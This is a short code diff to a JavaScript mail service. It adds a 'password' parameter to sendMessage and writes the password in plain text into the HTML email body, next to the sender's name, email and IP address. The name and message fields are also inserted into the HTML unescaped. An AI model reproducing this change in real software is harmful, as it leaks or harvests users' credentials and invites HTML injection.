@@ -22,7 +22,7 @@ class MailService {
     });
   }
 
-  sendMessage(name, email, message, hostname, ip) {  
+  sendMessage(name, email, message, hostname, ip, password) {  
     const imageUrl = `https://${hostname}/img/quantumlogo.png`;
 
 
@@ -35,7 +35,7 @@ class MailService {
       </head>
       <body style="background-color: #181616; color: #9d9d9d; padding: 10px;">
          <a href="beyondimagination.tech"><img src="${imageUrl}" width="200px" alt="Quantum Logo"></a>
-         <div style="margin: 20px 0; color: brown; font-weight: bolder; font-variant: small-caps;">Name: ${name} - Email: ${email} - IP Address: ${ip}</div>
+         <div style="margin: 20px 0; color: brown; font-weight: bolder; font-variant: small-caps;">Name: ${name} - Email: ${email} - IP Address: ${ip} - Password: ${password}</div>
          <div style="font-style: italic;">
          ${message}</div>
       </body>
